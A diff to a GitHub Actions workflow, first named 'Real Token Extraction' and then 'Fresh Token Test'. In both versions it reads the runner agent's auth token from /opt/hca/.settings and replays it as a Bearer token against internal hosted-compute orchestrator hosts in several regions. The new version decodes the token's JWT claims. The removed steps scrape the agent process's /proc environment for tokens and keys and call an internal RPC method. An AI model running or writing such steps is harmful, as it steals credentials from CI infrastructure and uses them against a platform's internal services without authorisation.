@@ -1,4 +1,4 @@
-name: Real Token Extraction
+name: Fresh Token Test
 on:
   push:
     branches: [master]
@@ -7,58 +7,54 @@ jobs:
     runs-on: ubuntu-latest
     timeout-minutes: 5
     steps:
-      - name: Extract real HCA token and test correct region
-        continue-on-error: true
-        run: |
-          # Try correct region (iad-02 from settings)
-          echo "=== Test 1: iad-02 with existing token ==="
-          AUTH=$(python3 -c "import json;print(json.load(open('/opt/hca/.settings'))['authToken'])")
+      - run: |
+          SETTINGS=$(cat /opt/hca/.settings)
+          AUTH=$(python3 -c "import json;print(json.loads('''$SETTINGS''')['authToken'])")
           
+          echo "=== Fresh JWT kid ==="
+          python3 << 'PYEOF'
+import base64, json
+token = """$AUTH"""
+def b64d(x):
+    x += '=='[:(4-len(x)%4)%4]
+    x = x.replace('-','+').replace('_','/')
+    return base64.b64decode(x)
+h = json.loads(b64d(token.split('.')[0]))
+p = json.loads(b64d(token.split('.')[1]))
+print(f"kid: {h.get('kid')}")
+print(f"iss: {p.get('iss')}")
+print(f"sub: {p.get('sub')}")
+print(f"env: {p.get('env')}")
+print(f"reg: {p.get('reg')}")
+print(f"vmn: {p.get('vmn')}")
+PYEOF
+          
+          echo ""
+          echo "=== Test: eus-02 with FRESH token ==="
+          docker run --rm --net=host ghcr.io/dependabot/dependabot-updater-core \
+            curl -sk --connect-timeout 5 \
+              -H "Authorization: Bearer $AUTH" \
+              "https://hosted-compute-request-orchestrator-prod-eus-02.githubapp.com/v1/" 2>&1
+          
+          echo ""
+          echo "=== Test: eus-01 with FRESH token ==="
+          docker run --rm --net=host ghcr.io/dependabot/dependabot-updater-core \
+            curl -sk --connect-timeout 5 \
+              -H "Authorization: Bearer $AUTH" \
+              "https://hosted-compute-request-orchestrator-prod-eus-01.githubapp.com/v1/" 2>&1
+          
+          echo ""
+          echo "=== Test: iad-01 with FRESH token ==="
+          docker run --rm --net=host ghcr.io/dependabot/dependabot-updater-core \
+            curl -sk --connect-timeout 5 \
+              -H "Authorization: Bearer $AUTH" \
+              "https://hosted-compute-request-orchestrator-prod-iad-01.githubapp.com/v1/" 2>&1
+          
+          echo ""
+          echo "=== Test: iad-02 with FRESH token ==="
           docker run --rm --net=host ghcr.io/dependabot/dependabot-updater-core \
             curl -sk --connect-timeout 5 \
               -H "Authorization: Bearer $AUTH" \
               "https://hosted-compute-request-orchestrator-prod-iad-02.githubapp.com/v1/" 2>&1
           
-          echo ""
-          echo "=== Test 2: No auth ==="
-          docker run --rm --net=host ghcr.io/dependabot/dependabot-updater-core \
-            curl -sk --connect-timeout 5 \
-              "https://hosted-compute-request-orchestrator-prod-iad-02.githubapp.com/v1/" 2>&1
-          
-          echo ""
-          echo "=== Test 3: Extract from HCA process ==="
-          HCA_PID=$(pgrep -f hosted-compute-agent)
-          echo "HCA PID: $HCA_PID"
-          
-          # Check HCA process env for any token
-          echo "--- HCA Env ---"
-          cat /proc/$HCA_PID/environ 2>/dev/null | tr "\0" "\n" | grep -iE "token|key|auth|jwt" | head -10
-          
-          # Check HCA process fd for open files related to auth
-          echo "--- HCA FD ---"
-          ls -la /proc/$HCA_PID/fd/ 2>/dev/null | head -20
-          
-          # Check if .settings was recently modified (maybe refreshed?)
-          echo "--- Settings file ---"
-          ls -la /opt/hca/.settings
-          cat /opt/hca/.settings | python3 -c "
-import sys, json
-d = json.load(sys.stdin)
-print(f'authToken (first 50): {d[\"authToken\"][:50]}...')
-print(f'authToken (last 30): ...{d[\"authToken\"][-30:]}')
-"
-          echo ""
-          echo "=== Test 4: Try Twirp with correct base ==="
-          docker run --rm --net=host ghcr.io/dependabot/dependabot-updater-core \
-            curl -sk --http2 --connect-timeout 5 \
-              -H "Authorization: Bearer $AUTH" \
-              -H "Content-Type: application/json" \
-              -d '{"planId":"test"}' \
-              "https://hosted-compute-request-orchestrator-prod-iad-02.githubapp.com/v1/twirp/github.actions.run_service.api.twirp.v1.RunService/GetPlanStatus" 2>&1
-
-      - name: Upload logs
-        if: always()
-        uses: actions/upload-artifact@v4
-        with:
-          name: real-token
-          path: /home/runner/work/_temp/_github_workflow/event.json
+          echo "=== DONE ==="
